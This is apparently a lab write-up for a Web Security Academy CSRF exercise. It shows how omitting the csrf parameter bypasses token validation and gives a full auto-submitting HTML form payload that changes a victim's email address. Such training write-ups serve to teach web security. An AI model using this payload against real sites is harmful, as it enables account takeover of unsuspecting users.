## Lab Description:

<img width="1380" height="895" alt="Screenshot 2025-11-13 210238" src="https://github.com/user-attachments/assets/362df5eb-4209-40fc-b46c-36e100a1e4e1" />

## Solution:

We need to change viewer's email address

First, we login like a normal user:

<img width="1905" height="623" alt="image" src="https://github.com/user-attachments/assets/4e1feb8f-6a37-44b6-a8cf-d7ca8e0f1950" />

Then we try to change user's email addresss:

<img width="1893" height="607" alt="image" src="https://github.com/user-attachments/assets/4bfd6735-6a67-46ea-b1c9-3b7ef61f9de5" />

The POST request is:

<img width="1915" height="700" alt="image" src="https://github.com/user-attachments/assets/dd4a5daf-0aea-45e8-a240-6b9a21bf3da3" />

The POST request has a CSRF tokens parameter: ```csrf=QVXsAy5a6Uh2bISahVVEUstfpObLCxsv```

What if we delete the value of csrf parameter:

<img width="1461" height="579" alt="image" src="https://github.com/user-attachments/assets/dc87c7d2-ee28-4169-9dc7-214ffec3bd9d" />

The server response is: ```"Missing parameter 'csrf'"```

But what if we delete all the csrf parameter, like it is not use CSRF tokens?

<img width="1463" height="632" alt="image" src="https://github.com/user-attachments/assets/ad2fb42f-24c0-4fc2-87ba-0ed5a6c69e43" />

Oh, it's works, so we have known that the server skip the validation if the token is omitted

We go to the exploit server and set the payload:
```
<html>
    <body>
        <form action="https://0a5a002e047d301d801c08ed00190035.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="sh1n@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

<img width="1887" height="768" alt="image" src="https://github.com/user-attachments/assets/e897c658-06ba-4021-9eb4-16b0b38645ae" />

Then click ```Store``` and ```View exploit```:

<img width="1900" height="617" alt="image" src="https://github.com/user-attachments/assets/2dc26b70-a8e1-4b55-aae3-189dc34920e1" />

The wiener's email address has been changed, we go to the exploit server again and change another email then click ```Deliver exploit to victim```

<img width="1903" height="805" alt="image" src="https://github.com/user-attachments/assets/9209f20e-8639-4871-b07c-33c2310e63e1" />

### The lab has been solved 
